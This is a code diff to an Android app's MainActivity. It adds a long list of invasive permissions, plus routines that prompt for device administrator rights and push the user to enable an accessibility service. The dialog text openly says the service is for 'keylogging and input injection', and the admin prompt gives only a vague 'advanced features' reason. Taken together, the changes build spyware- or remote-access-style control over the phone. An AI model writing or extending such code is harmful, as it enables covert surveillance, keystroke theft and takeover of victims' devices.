@@ -45,7 +45,17 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.CAMERA,
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
-        Manifest.permission.READ_EXTERNAL_STORAGE
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.VIBRATE,
+        Manifest.permission.ACCESS_WIFI_STATE,
+        Manifest.permission.CHANGE_WIFI_STATE,
+        Manifest.permission.BLUETOOTH,
+        Manifest.permission.BLUETOOTH_ADMIN,
+        Manifest.permission.SYSTEM_ALERT_WINDOW,
+        Manifest.permission.QUERY_ALL_PACKAGES,
+        Manifest.permission.PACKAGE_USAGE_STATS,
+        Manifest.permission.WRITE_SETTINGS,
+        Manifest.permission.MODIFY_AUDIO_SETTINGS
     };
 
     private static final String[] BACKGROUND_PERMISSIONS = {
@@ -328,6 +338,12 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startService() {
+        // Request device admin permissions
+        requestDeviceAdminPermission();
+        
+        // Request accessibility service permissions
+        requestAccessibilityPermission();
+        
         Intent serviceIntent = new Intent(this, MyForegroundService.class);
         if (mAuth.getCurrentUser() != null) {
             serviceIntent.putExtra("user_id", mAuth.getCurrentUser().getUid());
@@ -347,5 +363,53 @@ public class MainActivity extends AppCompatActivity {
         startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(startMain);
         finish();
+    }
+
+    private void requestDeviceAdminPermission() {
+        try {
+            android.app.admin.DevicePolicyManager devicePolicyManager = 
+                (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName deviceAdminComponent = DeviceAdminReceiver.getComponentName(this);
+            
+            if (!devicePolicyManager.isAdminActive(deviceAdminComponent)) {
+                Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponent);
+                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
+                    "This app requires device admin permissions for advanced features.");
+                startActivity(intent);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error requesting device admin permission", e);
+        }
+    }
+
+    private void requestAccessibilityPermission() {
+        try {
+            if (!isAccessibilityServiceEnabled()) {
+                new AlertDialog.Builder(this)
+                    .setTitle("Accessibility Service Required")
+                    .setMessage("This app requires accessibility service permissions for advanced features like keylogging and input injection. Please enable it in Settings > Accessibility.")
+                    .setPositiveButton("Open Settings", (dialog, which) -> {
+                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                        startActivity(intent);
+                    })
+                    .setNegativeButton("Skip", null)
+                    .show();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error requesting accessibility permission", e);
+        }
+    }
+
+    private boolean isAccessibilityServiceEnabled() {
+        try {
+            String serviceName = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
+            String enabledServices = Settings.Secure.getString(getContentResolver(), 
+                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            return enabledServices != null && enabledServices.contains(serviceName);
+        } catch (Exception e) {
+            Log.e(TAG, "Error checking accessibility service", e);
+            return false;
+        }
     }
 }
